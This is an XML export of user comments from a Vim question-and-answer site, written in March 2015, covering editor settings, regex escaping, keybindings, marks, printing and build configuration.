  <row Id="2318" PostId="2385" Score="0" Text="FWIW, I'm working from a Mac in Iterm2 with vim 7.4. &#xA;&#xA;As with most things shell-related I encounter that &quot;should work&quot; but mysteriously don't, I'm inclined to assume the issue it tied to being on OSX." CreationDate="2015-03-09T19:08:58.753" UserId="1166" />
  <row Id="2320" PostId="2436" Score="0" Text="It won't be the same, but it looks like your cygwin vim thinks it is on a light background - does `:set bg=dark` do anything?" CreationDate="2015-03-09T19:41:41.930" UserId="880" />
  <row Id="2321" PostId="2430" Score="0" Text="`:t` &quot;*Must* precede any :r or :e,&quot; yet `:e` &quot;only makes sense when used alone&quot;. By the example, I'd side with the latter, but interesting that the docs contradict themselves there." CreationDate="2015-03-09T20:50:26.527" UserId="1166" />
  <row Id="2322" PostId="2430" Score="0" Text="@SnoringFrog I believe what it means is that you can't do `:e:t`, but `:t:e` is allowed, if meaningless." CreationDate="2015-03-09T20:54:16.443" UserId="205" />
  <row Id="2323" PostId="2430" Score="0" Text="Oh, I see how it could be read that way. That makes sense then." CreationDate="2015-03-09T20:56:29.330" UserId="1166" />
  <row Id="2324" PostId="2285" Score="0" Text="@Bohr What version of vim are you using? I tried `:help keeppattern` and didn't get anything." CreationDate="2015-03-09T22:01:11.620" UserId="1111" />
  <row Id="2325" PostId="2455" Score="0" Text="Gui vim allows for more than 256 colors, as well as other text formatting, so that might be a draw.  I personally can't see why people prefer gui vim though, as I find terminal vim more convenient.  But that's my opinion." CreationDate="2015-03-09T23:47:53.660" UserId="865" />
  <row Id="2326" PostId="2456" Score="1" Text="If you want to repeat it, you probably could record it as a macro." CreationDate="2015-03-09T23:50:25.713" UserId="865" />
  <row Id="2327" PostId="2447" Score="0" Text="Good to know all different ways. Thanks!" CreationDate="2015-03-10T02:27:18.157" UserId="1283" />
  <row Id="2334" PostId="2285" Score="0" Text="@ChristopherBottoms At least version [7.4.155](ftp://ftp.vim.org/pub/vim/patches/7.4/README)." CreationDate="2015-03-10T04:51:42.337" UserId="1242" />
  <row Id="2336" PostId="2459" Score="0" Text="It also work for Linux world. If you want to open a file in vim directly from nautilus, gvim is available while vim is not." CreationDate="2015-03-10T05:32:48.307" UserId="1299" />
  <row Id="2337" PostId="2459" Score="0" Text="@kuldeep.kamboj This is simply a matter of configuring Nautilis; you can use `xterm -e vim %` or some such..." CreationDate="2015-03-10T09:28:48.673" UserId="51" />
  <row Id="2338" PostId="2464" Score="1" Text="Maybe [it's this issue](https://github.com/maksimr/vim-jsbeautify/issues/63)?" CreationDate="2015-03-10T09:37:54.593" UserId="51" />
  <row Id="2339" PostId="2456" Score="0" Text="This looks ok, thanks for the idea." CreationDate="2015-03-10T11:30:16.597" UserId="1296" />
  <row Id="2340" PostId="2454" Score="0" Text="Thanks. I'd go with &lt;kbd&gt;Control-a&lt;/kbd&gt; &lt;kbd&gt;Control-x&lt;/kbd&gt; &lt;kbd&gt;l&lt;/kbd&gt; &lt;kbd&gt;Control-a&lt;/kbd&gt;, since I don't like to add nonstandard keybinds, but this would surely be they way to do it if I had to do it really often. Thanks!" CreationDate="2015-03-10T11:31:54.193" UserId="1296" />
  <row Id="2341" PostId="2454" Score="0" Text="@PhilippFrank Yeah, that's the better answer :-) Even if you wanted to make a keybind out of this, you're probably best off basing it on that ;-)" CreationDate="2015-03-10T11:32:41.387" UserId="51" />
  <row Id="2345" PostId="2460" Score="4" Text="I'm voting to close this question as off-topic because it is about the configuration of some terminal emulator program." CreationDate="2015-03-10T12:25:29.050" UserId="13" />
  <row Id="2346" PostId="2460" Score="0" Text="You can find the list of supported terminal emulators on the [Solarized home page](http://ethanschoonover.com/solarized#terminal-emulators). Then, if supported, you can refer to the documentation of your terminal emulator to know how to set up Solarized." CreationDate="2015-03-10T12:26:47.853" UserId="13" />
  <row Id="2348" PostId="2459" Score="0" Text="That's exactly why I have `gVim` installed. Windows terminal fonts make your eyes bleed." CreationDate="2015-03-10T13:29:51.247" UserId="850" />
  <row Id="2349" PostId="2424" Score="0" Text="@elyashiv The _vimrc isn't populated with required settings.  It's just setting up some stuff that may or may not be useful to the user and providing some example settings.  The MyDiff function would fall in the example category, IMO." CreationDate="2015-03-10T13:35:26.317" UserId="15" />
  <row Id="2350" PostId="2470" Score="0" Text="Perhaps Vim can't find `libperl.so` and skips it because of that? You should post at least the full output of `vim --version` (has linker command) and preferable also the full output of `./configure` and `make`... You should have something like `-L/usr/lib/perl5/core_perl/CORE -lperl` in there." CreationDate="2015-03-10T14:07:04.180" UserId="51" />
  <row Id="2351" PostId="2285" Score="0" Text="@Bohr. Thanks! Come to find out I was still using 7.4.0. I installed the latest version and it's available." CreationDate="2015-03-10T14:08:01.490" UserId="1111" />
  <row Id="2352" PostId="2470" Score="0" Text="@Carpetsmoker You're right. That is missing. Thanks!" CreationDate="2015-03-10T14:17:17.083" UserId="1111" />
  <row Id="2353" PostId="2470" Score="0" Text="@Carpetsmoker Thanks. I didn't think to look in the middle of the configure output before your comment. I updated the question to focus on getting `profile` enabled (a necessity for me) and `perl` is more of a want." CreationDate="2015-03-10T14:25:44.667" UserId="1111" />
  <row Id="2354" PostId="2469" Score="5" Text="Note that this takes you to the middle of the line with respect to the *console width*, not with respect to the *line length*.  So, if you have a line of 10 characters and a console that is 80 characters wide, the cursor will end up on the 10th character in the line (because it's &quot;trying&quot; to get to the 40th), not the 5th." CreationDate="2015-03-10T14:29:25.867" UserId="239" />
  <row Id="2355" PostId="2469" Score="3" Text="Yep. From the question, it is not clear whether we're looking for the middle of the line or the middle of the screen. Based on the analogy to `M`, I assumed screen." CreationDate="2015-03-10T14:32:14.267" UserId="64" />
  <row Id="2358" PostId="2474" Score="1" Text="I am aware of the substitute command but I was hoping for something simpler..." CreationDate="2015-03-10T15:14:15.173" UserId="1305" />
  <row Id="2359" PostId="2442" Score="2" Text="Probably worth pointing out that 256 colours is still a lot less than that offered by GUI Vim." CreationDate="2015-03-10T15:20:02.317" UserId="343" />
  <row Id="2360" PostId="2414" Score="0" Text="`z]ip` is one more character than the sequence the OP has already dismissed as being too verbose! Upvoted anyway because your plugin looks nifty." CreationDate="2015-03-10T15:28:39.803" UserId="343" />
  <row Id="2361" PostId="2448" Score="0" Text="Can it be made to work with `[count]`?" CreationDate="2015-03-10T15:38:47.010" UserId="1248" />
  <row Id="2362" PostId="2414" Score="0" Text="@Rich, lol. That's certainly true in this case. I'll (weakly) defend myself by saying that verbosity can be measured in different ways: keystrokes is one, and number of actions is another. Technically, `z]ip` is one action whereas `]}o` is two." CreationDate="2015-03-10T15:53:18.907" UserId="64" />
  <row Id="2363" PostId="2414" Score="0" Text="Hahaha. Nice save ;)." CreationDate="2015-03-10T15:55:59.453" UserId="343" />
  <row Id="2364" PostId="2462" Score="2" Text="So is middle middle of the full line or middle of the screen width?" CreationDate="2015-03-10T16:26:36.793" UserId="205" />
  <row Id="2365" PostId="2476" Score="1" Text="This doesn't really seem like an appropriate question for vi.SE.  The versioning of a distribution's package is the discretion of the packager." CreationDate="2015-03-10T16:50:20.400" UserId="15" />
  <row Id="2366" PostId="2476" Score="0" Text="I'm voting to close this question as off-topic because it's not really about Vi or Vim as such, but about Debian's package versioning scheme." CreationDate="2015-03-10T17:21:33.420" UserId="51" />
  <row Id="2367" PostId="2448" Score="0" Text="This should do it:" CreationDate="2015-03-10T17:38:38.873" UserId="71" />
  <row Id="2368" PostId="2476" Score="0" Text="@Carpetsmoker it's not about Debian's versioning as such. Projects change version schemes (rarely, but it happens, a recent example being KDE Applications moving from 4.13 to 14.12 - date based). I wondered if something like that has happened with Vim as well - the epoch being an indicator of such a change." CreationDate="2015-03-10T17:41:44.610" UserId="205" />
  <row Id="2369" PostId="2476" Score="0" Text="@jamessan The question is not about the Debian package as such. It's just that the epoch can indicate a change in upstream version scheme, and I wondered if such a change had happened. Even if the versioning is left to the package maintainer's discretion, there's a reasonable expectation that it correspond to upstream versioning." CreationDate="2015-03-10T17:43:13.370" UserId="205" />
  <row Id="2370" PostId="2448" Score="0" Text="I ended up with this: `:onoremap &lt;leader&gt;ge :&lt;C-u&gt;exe &quot;norm! &quot;.v:count1.&quot;ge &quot;&lt;CR&gt;`" CreationDate="2015-03-10T19:18:20.077" UserId="1248" />
  <row Id="2373" PostId="2481" Score="0" Text="I'll wait for a bit, but guess this is the answer – unless there is a clever hack." CreationDate="2015-03-10T19:36:50.600" UserId="220" />
  <row Id="2374" PostId="2481" Score="0" Text="There was no patch there, just a wish, wasn't it?" CreationDate="2015-03-10T19:37:10.593" UserId="71" />
  <row Id="2375" PostId="2481" Score="0" Text="@ChristianBrabandt Doh.  You're right.  ZyX was doing a lot of hacking on the function code at the time, so I saw the post and just figured it had a patch." CreationDate="2015-03-10T19:47:08.197" UserId="15" />
  <row Id="2376" PostId="2481" Score="0" Text="@jamessan I remember that RFC, but I didn't completly understand what was meant so I never really tried to fix it" CreationDate="2015-03-10T20:44:25.643" UserId="71" />
  <row Id="2377" PostId="2484" Score="2" Text="I don't know the details, so for now I'll just comment: I'm pretty sure this has to do with a special key code created with `&lt;C-h&gt;`. If you try it in a terminal, you will see a similar behaviour. Also see `:h backspace`." CreationDate="2015-03-10T21:47:11.083" UserId="21" />
  <row Id="2378" PostId="2484" Score="0" Text="Thanks for the pointer @KarlYngveLervåg. May be worth noting that I use the Dvorak keyboard layout, which places the &quot;h&quot; letter underneath the J key (the &quot;j&quot; letter is underneath the C key). I mention this because `:h backspace` notes that &quot;&lt;NL&gt;&quot; is related to &quot;CTRL-J&quot;." CreationDate="2015-03-10T22:16:23.523" UserId="67" />
  <row Id="2379" PostId="2468" Score="0" Text="You can change the icon of a window with [`xseticon`](http://www.leonerd.org.uk/code/xseticon/) :-)" CreationDate="2015-03-10T23:54:00.010" UserId="51" />
  <row Id="2380" PostId="2486" Score="1" Text="I don't understand what the difference is? From reading the help pages, `echon` and `echomsg` work the same, except that `echomsg` adds messages to the history? You mentioned *&quot;I have been trying for some time now&quot;*, you should tell us what exactly you've tried, what you expected to happen, and what *did* happen. That way we can try and fix the problem you're having (if any) or explain some misconception you might have." CreationDate="2015-03-11T00:29:01.100" UserId="51" />
  <row Id="2387" PostId="2464" Score="0" Text="yeah, maybe, I find that thread too. But to change the vim script of a plugin seems a little too complex for me. So I've chose another approach. I've post an answer to my own question." CreationDate="2015-03-11T02:08:30.960" UserId="1276" />
  <row Id="2388" PostId="2435" Score="0" Text="@derobert Thanks, that seems like an acceptable answer. However, do you specifically know how to pipe to it from `vim`?" CreationDate="2015-03-11T03:31:14.667" UserId="1278" />
  <row Id="2389" PostId="2462" Score="0" Text="@muru Was thinking of middle of full line" CreationDate="2015-03-11T03:41:45.503" UserId="53" />
  <row Id="2390" PostId="2462" Score="2" Text="Could you add that to the question as well? And what do you expect to happen with wrapping?" CreationDate="2015-03-11T03:45:27.750" UserId="205" />
  <row Id="2391" PostId="2435" Score="0" Text="@Sparhawk following the above answer, replace the path to kprinter4 with `gtklp`, e.g: `call system(&quot;gtklp &quot; . a:fname)`. This will use gtklp as the print handler." CreationDate="2015-03-11T03:54:18.493" UserId="227" />
  <row Id="2392" PostId="2435" Score="0" Text="@derobert and JohnO'M. I don't think gtklp works here. I don't think it's passing the files correctly. http://i.imgur.com/DSWRYBx.png" CreationDate="2015-03-11T04:08:07.207" UserId="1278" />
  <row Id="2393" PostId="2435" Score="0" Text="@Sparhawk that's odd. Mine shows an item like `/tmp/vtPmLMz/10` in the &quot;Files to print&quot; list. Can you show us what your current settings for this in your vimrc are (either updating the question, via pastebin, or a screenshot of it in another comment)?" CreationDate="2015-03-11T04:22:50.640" UserId="227" />
  <row Id="2394" PostId="2435" Score="0" Text="I created a [minimal vimrc](http://pastebin.com/gqX9rdaf), which still exhibits this behaviour. I also have a bunch of plugins that I unloaded, launching vim with `vim -u ~/.vimrc foo`." CreationDate="2015-03-11T04:27:15.590" UserId="1278" />
  <row Id="2395" PostId="2435" Score="0" Text="@Sparhawk just tried it with your vimrc, and it still works for me. What happens if you run gtklp from the commandline? (e.g. as `gtklp somefakefile`). Does it show the arguments in the file list, or leave the file list empty still?" CreationDate="2015-03-11T04:30:42.643" UserId="227" />
  <row Id="2396" PostId="2435" Score="0" Text="Ha! Odd… The file list is still empty. I tried both a text file and a postscript file. Perhaps I'm missing a dependency." CreationDate="2015-03-11T04:37:30.020" UserId="1278" />
  <row Id="2397" PostId="2435" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21836/discussion-between-john-om-and-sparhawk)." CreationDate="2015-03-11T04:38:25.407" UserId="227" />
  <row Id="2398" PostId="2490" Score="1" Text="I wanted to tag this question [formatting] and [conceal], but I was not allowed to create new tags. Perhaps someone else could do that?" CreationDate="2015-03-11T09:41:18.120" UserId="1306" />
  <row Id="2400" PostId="2490" Score="0" Text="I thought that was what I did ask. Does it seem like I am asking about `par`? I mention it by way of context–it is how I currently format text. I am asking for alternatives to my current method that accommodate the discrepancy between displayed and actual line length introduced by concealing, I am not invested in any particular formatting method. Thanks for retagging (though I did not intend this question to be about syntax highlighting or external commands)." CreationDate="2015-03-11T10:14:39.197" UserId="1306" />
  <row Id="2401" PostId="2490" Score="0" Text="So you do ... I blame mornings without any coffee yet :-/ ... conceal seems to be a feature of Vim's syntax highlighting, which is why I tagged it as such :-)" CreationDate="2015-03-11T10:28:23.523" UserId="51" />
  <row Id="2402" PostId="2491" Score="0" Text="Can't believe I forgot to mention that in my answer! Upvoted." CreationDate="2015-03-11T12:58:54.587" UserId="343" />
  <row Id="2403" PostId="2494" Score="1" Text="Interesting! (Especially your idea about the threshold.) Thanks for the info. Gonna hold off on the upvote/accept for the time being in an attempt to encourage someone to come up with some crazy VimScript to do this in the interim." CreationDate="2015-03-11T13:35:00.177" UserId="343" />
  <row Id="2404" PostId="2495" Score="1" Text="Thanks for removing the duplicate submission on SO! (You can still post there in a few days if there's no progress here, though this beta site gets quite some attention in the moment.)" CreationDate="2015-03-11T14:18:35.343" UserId="970" />
  <row Id="2405" PostId="2424" Score="0" Text="For reference, here's another way: install [Chocolatey](https://chocolatey.org/), then run `cinst vim` from an administrator PowerShell (command prompt will work too, but PS is recommended). To upgrade it later, use `cup vim`. (The commands are short for `chocolatey install vim` and `chocolatey upgrade vim`, respectively. There's also a `choco` shorthand for `chocolatey`.)" CreationDate="2015-03-11T14:34:03.123" UserId="1230" />
  <row Id="2406" PostId="2496" Score="0" Text="I asked about other thing. Omni completion worked fine at that moment. But content of popup window was almost useless." CreationDate="2015-03-11T15:35:53.183" UserId="500" />
  <row Id="2407" PostId="2497" Score="1" Text="You shouldn't have to manually define those autocmds.  If you add `filetype plugin on` to your vimrc, then they should be automatically set." CreationDate="2015-03-11T15:37:31.213" UserId="15" />
  <row Id="2408" PostId="2497" Score="0" Text="@jamessan Yes, It is my very old config and there was some junk in it from that time when I started to learn vim. Hope my config without any issues anymore. Thank you for pointing on this." CreationDate="2015-03-11T15:40:21.487" UserId="500" />
  <row Id="2409" PostId="2498" Score="0" Text="Thanks for the reply. Will look into this soon. Where is $VIM (on a Mac)? I know $HOME is ~/ but not where $VIM/ ." CreationDate="2015-03-11T16:33:37.980" UserId="1168" />
  <row Id="2410" PostId="2498" Score="1" Text="Not sure on the Mac, Linux is /usr/share/vim typically. Probably pretty similar location." CreationDate="2015-03-11T16:35:20.587" UserId="895" />
  <row Id="2411" PostId="2498" Score="0" Text="It is the same on a Mac. Thanks." CreationDate="2015-03-11T16:47:28.660" UserId="1168" />
  <row Id="2412" PostId="2498" Score="0" Text="I edited `c-support/codesnippets/main.cc` but it didn't work so I edited the `c.idioms.template` file and it worked. Thanks." CreationDate="2015-03-11T17:38:01.293" UserId="1168" />
  <row Id="2413" PostId="2499" Score="1" Text="The only think in my vimrc file for pathogen is `execute pathogen#infect()` and it does not ask me to hit `enter`. Are you invoking it differently?" CreationDate="2015-03-11T18:24:01.260" UserId="383" />
  <row Id="2414" PostId="2500" Score="0" Text="Beat me to it :-)" CreationDate="2015-03-11T18:26:51.050" UserId="1155" />
  <row Id="2415" PostId="2491" Score="0" Text="Yes, I use the `:messages` command, but this also renders the main window *un-scrollable*. Another issue I have with it is that it stores 200 messages (running normal, not tiny Vim.) If one have typically 200 messages it is going to fill entire height of Vim + it usually yield 1NN+ messages before the ones I want. The whole process becomes somewhat cumbersome - especially on multiple errors. *But*; +1 as it is relevant." CreationDate="2015-03-11T18:40:36.390" UserId="220" />
  <row Id="2416" PostId="2485" Score="0" Text="Trying out some solutions based on the commands. Yes; it is when writing own scripts, (or debugging others), typically by `:so %` or the like." CreationDate="2015-03-11T19:10:58.857" UserId="220" />
  <row Id="2417" PostId="2491" Score="0" Text="In that case I think that the answer @Rich posted is what you are looking for. Maybe he could expand his answer to include mine such that it contains all relevant information?" CreationDate="2015-03-11T19:26:38.433" UserId="599" />
  <row Id="2418" PostId="2500" Score="0" Text="Missed that message it gave me!" CreationDate="2015-03-11T19:46:35.410" UserId="1168" />
  <row Id="2419" PostId="2450" Score="1" Text="Huh, this is interesting. I didn't know it was so easy to override a library call. This does technically answer my question (as does the other answer) but neither are as portable as I'd like (.vimrc setting would be ideal but I hate adding plugins for such a small problem). Is it bad etiquette to leave a question without a marked answer for a while?" CreationDate="2015-03-11T20:06:41.423" UserId="200" />
  <row Id="2420" PostId="2491" Score="0" Text="@Vitor I don't think that's necessary. It's fine for different answers to contain different solutions for the same problem. If people don't like my answer I'm sure they'll read yours, and vice versa!" CreationDate="2015-03-11T22:32:38.057" UserId="343" />
  <row Id="2422" PostId="2371" Score="0" Text="Somebody should make that an answer..." CreationDate="2015-03-12T02:23:55.973" UserId="1094" />
  <row Id="2423" PostId="2505" Score="0" Text="Is a solution to enable it for only certain files ok? Or do you also want it for example disabled in C comments but enabled in code?" CreationDate="2015-03-12T10:38:30.167" UserId="850" />
  <row Id="2424" PostId="2505" Score="0" Text="@Shahbaz: Enabling it only for certain files types is a solution I'd accept. However, your second sounds awesome if it were possible! ^_~" CreationDate="2015-03-12T10:51:14.487" UserId="622" />
  <row Id="2425" PostId="2484" Score="1" Text="Worth trying as a workaround: `noremap     &lt;C-h&gt; &lt;c-w&gt;&lt;c-h&gt;` (i.e. &lt;c-h&gt; instead of h) as they are equivalent" CreationDate="2015-03-12T12:00:00.570" UserId="182" />
  <row Id="2426" PostId="2469" Score="1" Text="Actually I just tried this on a wide (about 180 chars) screen with 80-char text. The cursor went to the *end* of the line. Doesn't seem a very useful command." CreationDate="2015-03-12T13:47:01.860" UserId="1094" />
  <row Id="2427" PostId="2508" Score="0" Text="Yup, I did try that but no joy. I get the same error." CreationDate="2015-03-12T13:53:38.917" UserId="622" />
  <row Id="2428" PostId="2486" Score="0" Text="I am sorry for being unclear. I've update the question in order for it to be more clear, in particular in that I want the `echon` functionality combined with adding messages to the history." CreationDate="2015-03-12T13:54:52.053" UserId="21" />
  <row Id="2429" PostId="2489" Score="1" Text="I've updated the question so the intent is clearer. I think you could likewise update the answer slightly following my update (but that's up to you). I believe your answer is sufficient for being marked &quot;accepted&quot;, although I am still hoping for some good idea for &quot;hacking&quot; the functionality with vim script." CreationDate="2015-03-12T13:56:48.990" UserId="21" />
  <row Id="2430" PostId="2484" Score="0" Text="@jalanb replacing my `&lt;C-h&gt;` remap with your suggestion causes an audible bell, and no cursor movement. (Pressing `&lt;C-w&gt;&lt;C-h&gt;` does work jump to the split to the left.)" CreationDate="2015-03-12T17:47:58.640" UserId="67" />
  <row Id="2431" PostId="2500" Score="0" Text="You may have escaped the `Press ENTER` gremlin for now, but sooner or later he will be back.  When that happens, check out `:h press-enter` for some tips to avoid him!" CreationDate="2015-03-12T17:58:01.603" UserId="630" />
  <row Id="2432" PostId="2518" Score="0" Text="Instead of `^` to go to the beginning of the line, you could use `B` to go to the beginning of the WORD." CreationDate="2015-03-12T18:09:08.490" UserId="226" />
  <row Id="2433" PostId="2475" Score="0" Text="A friendly way to do this might be to hit `V` or `va{` to select the lines that interest you (or drag-select them with the mouse), then do `:s/\&lt;i\&gt;/j/gc`.  The `c` flag asks for confirmation of each change, so you can feel extra confident that you didn't change anything unwanted.  If `hlsearch` is enabled, all the matches will be highlighted, so you can hit `a` if you see that you want to replace all of them." CreationDate="2015-03-12T18:10:22.007" UserId="630" />
  <row Id="2434" PostId="2478" Score="0" Text="To avoid typing the variable, I often hover over it and hit `*`.  Then `N` to go back to where I was.  Then `cwj&lt;Esc&gt;` then `n.n.n.n.` :)" CreationDate="2015-03-12T18:13:22.193" UserId="630" />
  <row Id="2435" PostId="2475" Score="0" Text="Although FWIW, I also use a [handy little plugin](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/replace.vim) for this task.  `\r` for whole file, `\R` for all buffers.  But no option to cover only the visual selection (the visual selection is taken as the search pattern)." CreationDate="2015-03-12T18:21:13.157" UserId="630" />
  <row Id="2436" PostId="2518" Score="0" Text="Not all URL all perfectly formed. A **LOT** don't have the `?` character and just use the `&amp;`. Browser automatically compensate (so you don't notice it much) but there are a significant number out there. So I would replace the `df?` with `d/[?&amp;]&lt;enter&gt;x`" CreationDate="2015-03-12T18:30:15.937" UserId="383" />
  <row Id="2437" PostId="2517" Score="2" Text="Have you tried anything so far? By showing your attempts and describing what parts you are having difficulty with, we get a better understanding of your proficiency and can give a more precise answer. As it stands, it just looks like you've posted a requirement and want someone to write your code for you." CreationDate="2015-03-12T18:36:23.663" UserId="970" />
  <row Id="2438" PostId="2513" Score="0" Text="thanks jamessan. I tried &quot;nnoremap gf &lt;c-w&gt;gF&quot; but its opening file in new tab. How to open it in horizontally split window rather than newtab." CreationDate="2015-03-12T19:10:24.537" UserId="1334" />
  <row Id="2439" PostId="2513" Score="0" Text="Thanks I tried &quot;nnoremap gf &lt;C-w&gt;F&quot; and it solved my problem. Thanks all." CreationDate="2015-03-12T19:20:23.387" UserId="1334" />
  <row Id="2440" PostId="2520" Score="0" Text="This got flagged as low quality. Perhaps you could add in the information in https://github.com/neovim/neovim/issues/2048#issuecomment-78045837 which seems to have a workaround?" CreationDate="2015-03-12T19:29:16.383" UserId="205" />
  <row Id="2441" PostId="2520" Score="0" Text="@mur Or close the question because it's likely not going to be useful long term.  vi.SE isn't a bug reporting forum." CreationDate="2015-03-12T19:31:42.223" UserId="15" />
  <row Id="2442" PostId="2520" Score="0" Text="From the question, it's not that obvious this is a bug... This question is probably flagged automatically because it's below a certain numbers of characters &amp; has a link." CreationDate="2015-03-12T19:56:07.640" UserId="51" />
  <row Id="2443" PostId="2522" Score="0" Text="Yeah, `^I` is marginally better than `&lt;09&gt;`, but it's still too noisy for my liking, as I can't easily scan the register list for the line I want..." CreationDate="2015-03-12T20:20:39.860" UserId="51" />
  <row Id="2444" PostId="2450" Score="0" Text="@ChadParadis Feel free to accept an answer or not as you see fit. The only case in which it's bad etiquette not to accept an answer is when there is a definitive, comprehensive, clearly correct, well-explained answer. My answer is absolutely not definitive or comprehensive: I can only offer a partial, cumbersome solution." CreationDate="2015-03-12T20:39:15.527" UserId="8" />
  <row Id="2445" PostId="2478" Score="1" Text="The advantage of using gn is, you do not have to type `n.n.` but only `.`" CreationDate="2015-03-12T21:30:50.117" UserId="71" />
  <row Id="2446" PostId="2524" Score="0" Text="That is both good to know and an improvement, but still not ideal. What I'm really looking for is a succinct way to yank upward without having to move the cursor back to where it was." CreationDate="2015-03-12T22:04:33.430" UserId="163" />
  <row Id="2447" PostId="2524" Score="0" Text="Thanks, your edit is pretty much what I'm looking for. Your first paragraph, however, doesn't seem to work as you describe: `]` does not move to the end of what I yank." CreationDate="2015-03-12T22:13:57.773" UserId="163" />
  <row Id="2448" PostId="2524" Score="0" Text="He said `']` not `]`." CreationDate="2015-03-12T22:26:28.940" UserId="865" />
  <row Id="2449" PostId="2525" Score="1" Text="That.... is even better. It's more succinct, and somehow feels more Vim-y. Thanks!" CreationDate="2015-03-12T22:37:17.943" UserId="163" />
  <row Id="2450" PostId="2516" Score="1" Text="If what the OP really wanted is to look at compilation errors then using `:make` and the quickfix is the way to go. Also take a look at `:compiler` for setting common different `'makeprg'` and `'errorformat'`'s (See `:h :compiler`). I also find it good to have nice mappings for `:cn`/`:cp`. I use Tim Pope's [unimpaired.vim](https://github.com/tpope/vim-unimpaired) which provide `]q` and `[q` respectively." CreationDate="2015-03-12T23:52:26.660" UserId="778" />
  <row Id="2451" PostId="2528" Score="0" Text="You could use `m'`." CreationDate="2015-03-13T08:11:45.013" UserId="54" />
  <row Id="2452" PostId="2528" Score="0" Text="Sorry if my question is not clear. I want to know which mark is set on the current line. Is there a command through which Vim will display mark set on the current line?" CreationDate="2015-03-13T09:01:01.030" UserId="230" />
  <row Id="2453" PostId="2526" Score="0" Text="you can also press `i` and use the backspace key. No body will shoot you for that. I think." CreationDate="2015-03-13T09:46:49.587" UserId="342" />
  <row Id="2454" PostId="2526" Score="0" Text="but backspace won't delete character of above line" CreationDate="2015-03-13T09:56:12.923" UserId="1276" />
  <row Id="2455" PostId="2527" Score="1" Text="It's probably worth mentioning that you need to hit `Enter` after typing `d?1`." CreationDate="2015-03-13T10:08:13.837" UserId="343" />
  <row Id="2456" PostId="2527" Score="0" Text="@Rich indeed thanks, I have updated the answer to include that." CreationDate="2015-03-13T10:10:31.517" UserId="246" />
  <row Id="2457" PostId="2531" Score="0" Text="why dk will delete both current line and above line completely" CreationDate="2015-03-13T10:14:45.823" UserId="1276" />
  <row Id="2458" PostId="2526" Score="2" Text="@AaronShen That depends on your 'backspace' setting. If it includes `eol` then backspace *will* delete line breaks. You'll also need `start` to be included in the setting. (See `:help backspace`). Don't use this method though! There are several much faster methods detailed in the answers below." CreationDate="2015-03-13T10:17:12.027" UserId="343" />
  <row Id="2459" PostId="2531" Score="0" Text="@AaronShen Nope. Try it." CreationDate="2015-03-13T10:18:05.113" UserId="343" />
  <row Id="2460" PostId="2531" Score="1" Text="@Rich if that works for you then you have a setting that enables that delete movement. I've just tested it with `vim -u NONE -U NONE` and it deletes both lines." CreationDate="2015-03-13T11:40:45.300" UserId="599" />
  <row Id="2461" PostId="2527" Score="1" Text="What font is that shell using?" CreationDate="2015-03-13T12:24:39.577" UserId="1346" />
  <row Id="2465" PostId="2531" Score="0" Text="@Vitor You're right. Trying to figure out which setting does it, now." CreationDate="2015-03-13T12:50:53.350" UserId="343" />
  <row Id="2466" PostId="2531" Score="0" Text="Your &quot;delete up&quot; trick works if you replace `gk` for `k`." CreationDate="2015-03-13T13:15:49.220" UserId="13" />
  <row Id="2467" PostId="2531" Score="0" Text="@toro2k Yup! You commented as I was editing my answer to say so :)." CreationDate="2015-03-13T13:17:14.263" UserId="343" />
  <row Id="2468" PostId="2534" Score="0" Text="The 'nocompatible' thing was a complete red herring. I messed up when I was testing because I am an idiot." CreationDate="2015-03-13T13:19:50.287" UserId="343" />
  <row Id="2469" PostId="2531" Score="0" Text="@AaronShen Apologies for my (repeated) mistakes!" CreationDate="2015-03-13T13:20:22.417" UserId="343" />
  <row Id="2470" PostId="2531" Score="0" Text="Nice! I wasn't aware of this trick. But I can see that you have `k` mapped to `gk`!" CreationDate="2015-03-13T15:03:27.660" UserId="599" />
  <row Id="2471" PostId="2527" Score="0" Text="@ChrisBurt-Brown: Terminus" CreationDate="2015-03-13T15:24:36.097" UserId="246" />
  <row Id="2472" PostId="2531" Score="0" Text="@Vitor Yup. Hence all the confusion you can see in my repeated edits!" CreationDate="2015-03-13T15:31:34.483" UserId="343" />
  <row Id="2473" PostId="2536" Score="2" Text="Minor note: You can use `\zs` and `\ze` independently. In this case, the `\zs` can be omitted since it's at the start of the pattern already." CreationDate="2015-03-13T18:23:46.913" UserId="64" />
  <row Id="2474" PostId="2538" Score="2" Text="I'm not too sure but I /think/ this is a bug. I also could be wrong so I'm not posting this as an answer. However, to circumvent this, you can search \[ using /\\[ and then use `:s///g` Here, vim will use the old search term in the blank pattern" CreationDate="2015-03-13T19:18:53.487" UserId="246" />
  <row Id="2475" PostId="2538" Score="0" Text="I suspect that ```\[``` has some special meaning which i do not understand and can't find it on google." CreationDate="2015-03-13T19:19:47.897" UserId="1067" />
  <row Id="2476" PostId="2538" Score="1" Text="You can use the very nomagic mode like so:  `:s/\V\\[//g` (See `:help \V`)" CreationDate="2015-03-13T19:22:03.920" UserId="246" />
  <row Id="2477" PostId="2538" Score="1" Text="I tried it, and it works if you escape the `[` like so: `:s/\\\[//g`" CreationDate="2015-03-13T19:23:08.387" UserId="865" />
  <row Id="2479" PostId="2538" Score="0" Text="Yea i noticed it myself at the same time, it was malformed regex without closing ```]```. Thank you." CreationDate="2015-03-13T19:31:48.967" UserId="1067" />
  <row Id="2480" PostId="2540" Score="0" Text="Just a small comment, `\V` means very _no_ magic" CreationDate="2015-03-13T19:40:10.900" UserId="246" />
  <row Id="2481" PostId="2540" Score="0" Text="@Akshay: Right, corrected!" CreationDate="2015-03-13T19:50:00.250" UserId="970" />
  <row Id="2482" PostId="2538" Score="1" Text="@Akshay: I think it's a bug, too. Posted [here on vim_dev](https://groups.google.com/d/msg/vim_dev/IGubDymd4iw/rqe7LDCwQZsJ)." CreationDate="2015-03-13T20:55:54.260" UserId="970" />
  <row Id="2483" PostId="2543" Score="2" Text="I think the last `d` acts as a confirm; So it's the same as `d3&lt;CR&gt;`. `y3y` and `c3c` also work the same ... I can't find any docs on this though in either the Vim :help, vi(1), nvi(1), or the POSIX spec... It does behave the same in `vi` and `nvi` btw." CreationDate="2015-03-13T23:04:38.013" UserId="51" />
  <row Id="2484" PostId="2544" Score="0" Text="I assume the `pre-commit` hook works fine when you just use `git commit`? What happens if you use a very simple `pre-commit` hook like only `exit 0` or `exit 1`?" CreationDate="2015-03-13T23:08:40.543" UserId="51" />
